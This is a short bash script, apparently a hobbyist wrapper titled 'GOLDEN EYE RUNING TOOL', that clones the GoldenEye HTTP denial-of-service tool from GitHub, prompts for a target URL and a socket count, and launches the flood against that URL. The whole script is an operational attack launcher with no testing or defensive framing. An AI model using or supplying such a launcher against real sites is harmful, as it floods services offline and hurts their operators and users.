#Colours
black="\033[1;30m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
blue="\033[1;34m"
purple="\033[1;35m"
cyan="\033[1;36m"
violate="\033[1;37m"
white="\033[0;37m"
nc="\033[00m"

echo ""
echo ""
echo ""
echo -e "${yellow}   GOLDEN EYE RUNING TOOL"
echo -e "${cyan}          [By THARUU X]"
echo ""
echo ""
echo ""

sleep 0.5s

echo -e "${green} Installing git link..."
git clone https://github.com/jseidl/GoldenEye.git
sleep 0.5s

echo -e "${cyan} Running tool..."
cd GoldenEye
sleep 0.5s

echo -e "${red}           Enter the url."
read URL
echo -e "${red}           Enter a number to hit."
read NUM
sleep 0.5s

python goldeneye.py $URL -s $NUM
